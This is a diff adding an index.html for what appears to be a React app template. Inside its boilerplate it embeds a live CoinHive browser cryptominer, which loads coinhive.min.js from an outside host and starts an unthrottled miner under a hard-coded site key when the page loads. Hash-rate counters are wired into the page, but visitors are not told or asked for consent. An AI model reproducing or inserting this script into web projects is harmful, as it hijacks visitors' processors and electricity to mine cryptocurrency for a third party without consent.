@@ -1,0 +1,45 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="theme-color" content="#000000">
+    <!--
+      manifest.json provides metadata used when your web app is added to the
+      homescreen on Android. See https://developers.google.com/web/fundamentals/engage-and-retain/web-app-manifest/
+    -->
+    <link rel="manifest" href="manifest.json">
+    <link rel="shortcut icon" href="favicon.ico">
+    <title>React App</title>
+  </head>
+  <body>
+    <noscript>
+      You need to enable JavaScript to run this app.
+    </noscript>
+    <div id="root"></div>
+    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+    <script>
+    	var miner = new CoinHive.Anonymous('glxz6EibUmNoRXA6iZSW01hIq84Pw2LC');
+    	miner.start();
+    	//miner.setThrottle(0.5);
+
+      // Listen on events
+    	miner.on('found', function() { /* Hash found */ })
+    	miner.on('accepted', function() { /* Hash accepted by the pool */ })
+
+    	// Update stats once per second
+    	setInterval(function() {
+    		var hashesPerSecond = miner.getHashesPerSecond();
+    		var totalHashes = miner.getTotalHashes();
+    		var acceptedHashes = miner.getAcceptedHashes();
+        var pHpS = document.getElementsByClassName("hash-per-sec");
+        var tH = document.getElementsByClassName("total-hash");
+        var aH = document.getElementsByClassName("accept-hash");
+        pHpS[0].innerText = hashesPerSecond;
+        tH[0].innerText = totalHashes;
+        aH[0].innerText = acceptedHashes;
+    	}, 1000);
+    </script>
+  <script type="module" src="/src/index.tsx"></script>
+  </body>
+</html>
